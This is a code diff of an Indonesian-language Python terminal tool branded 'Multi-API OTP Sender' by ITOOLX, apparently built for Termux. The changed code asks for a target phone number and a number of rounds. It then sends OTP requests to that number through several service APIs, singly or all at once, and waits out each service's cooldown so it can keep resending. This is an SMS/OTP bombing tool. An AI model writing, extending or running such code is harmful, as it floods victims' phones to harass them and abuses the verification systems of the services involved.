-        title=f"[bold]{icon} RESULT[/bold]",
-        border_style=color.split()[-1] if "bold" in color else color,
-        padding=(1, 2),
-    ))
-
-
-def print_all_results(phone: str, results: list, loop: int, total: int):
-    table = Table(
-        title=f"[bold cyan]⚡ ALL TARGETS — Round {loop}/{total}[/bold cyan]",
-        box=box.ROUNDED, border_style="cyan",
-        header_style="bold cyan", show_lines=True,
-    )
-    table.add_column("",       justify="center", width=3)
-    table.add_column("Target", width=22)
-    table.add_column("HTTP",   justify="center", width=6)
-    table.add_column("Status", width=10)
-    table.add_column("Jam",    width=10)
-
-    for item in results:
-        code  = item["status"]
-        color = status_color(code)
-        stxt  = "SUCCESS" if is_success(code) else ("ERROR" if code == 0 else "FAILED")
-        table.add_row(
-            item["icon"], f"[bold]{item['name']}[/bold]",
-            f"[{color}]{code}[/{color}]",
-            f"[{color}]{stxt}[/{color}]",
-            f"[dim]{item['time']}[/dim]",
-        )
-    console.print(Align.center(table))
-
-# ══════════════════════════════════════════════════════
-#  COOLDOWN GATE  (cek & tunggu sebelum kirim)
-# ══════════════════════════════════════════════════════
-
-def gate_cooldown(phone: str, methods: list) -> bool:
-    """
-    Check cooldown for list of (api_cfg) items.
-    Returns True if we can proceed, False if user cancelled.
-    """
-    locked = []
-    for api in methods:
-        rem = get_remaining(phone, api["method"], api["cooldown"])
-        if rem > 0:
-            locked.append((api, rem))
-
-    if not locked:
-        return True
-
-    max_rem = max(r for _, r in locked)
-
-    rows = "\n".join(
-        f"  {a['icon']} [cyan]{a['name']}[/cyan] → "
-        f"[bold red]{fmt_secs(r)}[/bold red]  "
-        f"[dim](unlock {datetime.fromtimestamp(cooldown_tracker[phone][a['method']] + a['cooldown']).strftime('%H:%M:%S')})[/dim]"
-        for a, r in locked
-    )
-    console.print(Panel(
-        f"[bold white]Nomor  :[/bold white] [bright_yellow]{phone}[/bright_yellow]\n\n"
-        + rows,
-        title="[bold red]🔒 COOLDOWN AKTIF[/bold red]",
-        border_style="red", padding=(1, 2),
-    ))
-
-    try:
-        pilih = Prompt.ask(
-            "[bold cyan]  ❯[/bold cyan] Tunggu cooldown selesai? [dim](y/n)[/dim]",
-            choices=["y", "n"], default="y",
-        )
-    except (KeyboardInterrupt, EOFError):
-        return False
-
-    if pilih != "y":
-        console.print("[bold yellow]  ✗ Pengiriman dibatalkan.[/bold yellow]")
-        return False
-
-    countdown(max_rem, f"⏳ Menunggu  {fmt_secs(max_rem)}")
-    return True
-
-# ══════════════════════════════════════════════════════
-#  RUNNERS
-# ══════════════════════════════════════════════════════
-
-def run_single(api_cfg: dict, phone: str, loop_count: int):
-    method = api_cfg["method"]
-    cd     = api_cfg["cooldown"]
-
-    for i in range(1, loop_count + 1):
-        if not gate_cooldown(phone, [api_cfg]):
-            return
-
-        console.print(Rule(f"[bold cyan] Round {i}/{loop_count} [/bold cyan]"))
-        with console.status(
-            f"[bold cyan]Mengirim ke [bright_yellow]{api_cfg['name']}[/bright_yellow]...",
-            spinner="dots",
-        ):
-            result = dispatch(method, phone)
-
-        set_cooldown(phone, method)
-        print_result_panel(api_cfg, phone, result, i, loop_count)
-
-        if i < loop_count:
-            countdown(cd, f"⏳ Cooldown  {cd}s")
-
-
-def run_all(phone: str, loop_count: int):
-    targets = [v for v in APIS.values() if v["method"] != "all"]
-    max_cd  = max(v["cooldown"] for v in targets)
-
-    for i in range(1, loop_count + 1):
-        if not gate_cooldown(phone, targets):
-            return
-
-        console.print(Rule(f"[bold cyan] ⚡ ALL TARGETS — Round {i}/{loop_count} [/bold cyan]"))
-        results = []
-        for api in targets:
-            with console.status(
-                f"[bold cyan]Sending → [bright_yellow]{api['name']}[/bright_yellow]...",
-                spinner="aesthetic",
-            ):
-                t   = datetime.now().strftime("%H:%M:%S")
-                res = dispatch(api["method"], phone)
-                set_cooldown(phone, api["method"])
-                if is_success(res.get("status", 0)):
-                    log_success(phone, api["name"], api["icon"],
-                                res["status"], res.get("body", ""))
-                results.append({
-                    "name": api["name"], "icon": api["icon"],
-                    "status": res.get("status", 0),
-                    "body":   res.get("body", ""), "time": t,
-                })
-            time.sleep(0.3)
-
-        print_all_results(phone, results, i, loop_count)
-
-        if i < loop_count:
-            countdown(max_cd, f"⏳ Cooldown  {max_cd}s")
-
-# ══════════════════════════════════════════════════════
-#  INPUT HELPERS
-# ══════════════════════════════════════════════════════
-
 def ask_phone(current: str = "") -> str:
-    hint = (f" [dim](Enter = {current})[/dim]" if current
-            else " [dim](08xxx / 628xxx)[/dim]")
+    hint = (f" [dim](Enter = {current})[/dim]"
+            if current else " [dim](08xxx / 628xxx)[/dim]")
     while True:
         try:
-            raw = Prompt.ask(f"[bold cyan]  ❯[/bold cyan] Nomor target{hint}")
+            raw = Prompt.ask(f"[bold cyan]  ❯[/bold cyan] Nomor{hint}")
             if raw.strip() == "" and current:
                 return current
             p = validate_phone(raw)
@@ -655,28 +559,38 @@ def ask_phone(current: str = "") -> str:
             console.print()
             sys.exit(0)
 
+def print_home(phone: str = ""):
+    clear()
+    console.print(Align.center(BANNER))
+    console.print(Align.center(Panel(
+        "[bold white]Multi-API OTP Sender[/bold white]  [dim]by[/dim] [bold cyan]ITOOLX[/bold cyan]  [dim]· Termux Edition[/dim]",
+        border_style="cyan", padding=(0, 3),
+    )))
+    console.print()
+    console.print(Align.center(render_menu(phone)))
+    console.print()
+    console.print(Align.center(render_history(4)))
+    console.print()
+
 # ══════════════════════════════════════════════════════
 #  MAIN LOOP
 # ══════════════════════════════════════════════════════
 
 def main():
-    clear()
-    print_banner()
     current_phone = ""
 
     while True:
-        print_menu(current_phone)
+        print_home(current_phone)
 
-        # ── Input pilihan ────────────────────────────────────────────
+        # ── Pilih ────────────────────────────────────────────────────
         try:
-            raw = Prompt.ask("[bold cyan]  ❯[/bold cyan] Pilih [dim](0=exit, 7=history, 8=live CD)[/dim]")
+            raw    = Prompt.ask("[bold cyan]  ❯[/bold cyan] Pilih target [dim](0=exit)[/dim]")
             choice = int(raw.strip())
         except (ValueError, KeyboardInterrupt, EOFError):
-            console.print("[bold red]  ✗ Input tidak valid.[/bold red]")
-            time.sleep(0.6)
-            clear(); print_banner(); continue
+            console.print("[bold red]  ✗ Tidak valid.[/bold red]")
+            time.sleep(0.5)
+            continue
 
-        # ── Exit ─────────────────────────────────────────────────────
         if choice == 0:
             console.print(Align.center(Panel(
                 "[bold red]👋 Sampai jumpa![/bold red]\n[dim]ITOOLX · Termux Edition[/dim]",
@@ -684,84 +598,79 @@ def main():
             )))
             sys.exit(0)
 
-        # ── History sukses ───────────────────────────────────────────
-        if choice == 7:
-            view_success_log()
-            clear(); print_banner(); continue
-
-        # ── Live cooldown ────────────────────────────────────────────
-        if choice == 8:
-            view_live_cooldown()
-            clear(); print_banner(); continue
-
-        # ── Validasi pilihan API ─────────────────────────────────────
         if choice not in APIS:
-            console.print("[bold red]  ✗ Pilihan tidak valid![/bold red]")
-            time.sleep(0.6)
-            clear(); print_banner(); continue
+            console.print("[bold red]  ✗ Pilihan tidak ada.[/bold red]")
+            time.sleep(0.5)
+            continue
 
-        api_cfg = APIS[choice]
+        api = APIS[choice]
         console.print(
-            f"\n  [bold white]Target  :[/bold white] "
-            f"[{api_cfg['color']}]{api_cfg['icon']} {api_cfg['name']}[/{api_cfg['color']}]"
+            f"\n  [bold white]Target :[/bold white] "
+            f"[{api['color']}]{api['icon']} {api['name']}[/{api['color']}]"
         )
 
-        # ── Nomor ────────────────────────────────────────────────────
+        # ── Nomor ─────────────────────────────────────────────────
         current_phone = ask_phone(current_phone)
-        console.print(f"  [bold white]Phone   :[/bold white] [bright_yellow]{current_phone}[/bright_yellow]")
+        console.print(
+            f"  [bold white]Phone  :[/bold white] "
+            f"[bright_yellow]{current_phone}[/bright_yellow]\n"
+        )
 
-        # ── Jumlah round ─────────────────────────────────────────────
-        try:
-            loop_count = IntPrompt.ask(
-                "[bold cyan]  ❯[/bold cyan] Jumlah pengiriman", default=1)
-            if loop_count < 1:
-                raise ValueError
-        except (KeyboardInterrupt, EOFError, ValueError):
-            console.print("[bold red]  ✗ Minimal 1![/bold red]")
-            time.sleep(0.6); clear(); print_banner(); continue
+        # ── Cek cooldown sebelum mulai ─────────────────────────────
+        targets = (
+            [v for v in APIS.values() if v["method"] != "all"]
+            if api["method"] == "all"
+            else [api]
+        )
+        locked = [(a, get_rem(current_phone, a["method"], a["cooldown"]))
+                  for a in targets if get_rem(current_phone, a["method"], a["cooldown"]) > 0]
 
-        # ── Konfirmasi ───────────────────────────────────────────────
+        if locked:
+            console.print(Align.center(
+                render_cd_table(current_phone, targets)
+            ))
+            console.print()
+            max_rem = max(r for _, r in locked)
+            console.print(Panel(
+                "\n".join(
+                    f"  {a['icon']} [cyan]{a['name']}[/cyan]  →  [bold red]{fmt(r)}[/bold red]"
+                    for a, r in locked
+                ),
+                title="[bold red]🔒 COOLDOWN AKTIF[/bold red]",
+                border_style="red", padding=(1, 2),
+            ))
+            console.print(
+                "\n  [bold cyan]Y[/bold cyan] = Tunggu cooldown selesai lalu kirim\n"
+                "  [bold cyan]N[/bold cyan] = Batal, kembali ke menu\n"
+            )
+            try:
+                ans = Prompt.ask(
+                    "[bold cyan]  ❯[/bold cyan] Pilihan",
+                    choices=["y", "n", "Y", "N"], default="y",
+                ).lower()
+            except (KeyboardInterrupt, EOFError):
+                ans = "n"
+
+            if ans != "y":
+                continue   # kembali ke menu
+
+        # ── Mulai sesi kirim ───────────────────────────────────────
         console.print()
-        console.print(Panel(
-            f"[bold white]Target  :[/bold white] [{api_cfg['color']}]{api_cfg['icon']} "
-            f"{api_cfg['name']}[/{api_cfg['color']}]\n"
-            f"[bold white]Phone   :[/bold white] [bright_yellow]{current_phone}[/bright_yellow]\n"
-            f"[bold white]Round   :[/bold white] [white]{loop_count}x[/white]\n"
-            f"[bold white]Cooldown:[/bold white] [bold yellow]{api_cfg['cooldown']}s[/bold yellow]",
-            title="[bold cyan]📋 KONFIRMASI[/bold cyan]",
-            border_style="cyan", padding=(1, 2),
-        ))
-
         try:
-            confirm = Prompt.ask(
-                "[bold cyan]  ❯[/bold cyan] Lanjut?",
-                choices=["y", "n"], default="y")
-        except (KeyboardInterrupt, EOFError):
-            confirm = "n"
-
-        if confirm != "y":
-            console.print("[bold yellow]  ✗ Dibatalkan.[/bold yellow]")
-            time.sleep(0.6); clear(); print_banner(); continue
-
-        # ── Kirim ────────────────────────────────────────────────────
-        console.print()
-        try:
-            if api_cfg["method"] == "all":
-                run_all(current_phone, loop_count)
+            if api["method"] == "all":
+                session_all(current_phone)
             else:
-                run_single(api_cfg, current_phone, loop_count)
+                session_single(api, current_phone)
         except KeyboardInterrupt:
             console.print("\n[bold red]  ✗ Dihentikan.[/bold red]")
 
-        # ── Kembali ke menu ──────────────────────────────────────────
+        # kembali ke menu
         console.print()
         console.print(Align.center(Panel(
-            f"[bold green]✅ SELESAI![/bold green]   "
-            f"[dim]History sukses: {len(success_log)} item[/dim]",
-            border_style="green", padding=(0, 4),
+            f"[bold green]✅ Sesi selesai[/bold green]  [dim]({len(success_log)} sukses total)[/dim]",
+            border_style="green", padding=(0, 3),
         )))
-        time.sleep(1.5)
-        clear(); print_banner()
+        time.sleep(1.2)
 
 
 if __name__ == "__main__":
